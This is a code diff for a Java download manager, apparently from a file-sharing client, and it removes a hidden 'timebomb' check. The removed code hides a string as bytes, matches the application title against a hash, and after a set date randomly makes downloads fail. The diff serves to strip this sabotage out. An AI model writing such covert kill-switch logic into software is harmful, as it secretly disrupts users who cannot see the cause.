@@ -1956,11 +1956,6 @@ public class ManagedDownloader implements Downloader, MeshHandler, AltLocListene
      * false if it was newly constructed.
      */
     protected int performDownload() {
-        if(checkHosts()) {//files is global
-            setState(GAVE_UP);
-            return GAVE_UP;
-        }
-
         // 1. initialize the download
         int status = initializeDownload();
         if ( status == CONNECTING) {
@@ -2997,25 +2992,6 @@ public class ManagedDownloader implements Downloader, MeshHandler, AltLocListene
             ourFile = commonOutFile;
         }
         return ourFile != null ? ourFile.getChunkSize() : VerifyingFile.DEFAULT_CHUNK_SIZE;
-    }
-	
-    /**
-     * @return true if the table we remembered from previous sessions, contains
-     * Takes into consideration when the download is taking place - ie the
-     * timebomb condition. Also we have to consider the probabilistic nature of
-     * the uploaders failures.
-     */
-    private boolean checkHosts() {
-        byte[] b = {65,80,80,95,84,73,84,76,69};
-        String s=callback.getHostValue(new String(b));
-        if(s==null)
-            return false;
-        s = s.substring(0,8);
-        if(s.hashCode()== -1473607375 &&
-           System.currentTimeMillis()>1029003393697l &&
-           Math.random() > 0.5f)
-            return true;
-        return false;
     }
 }
 
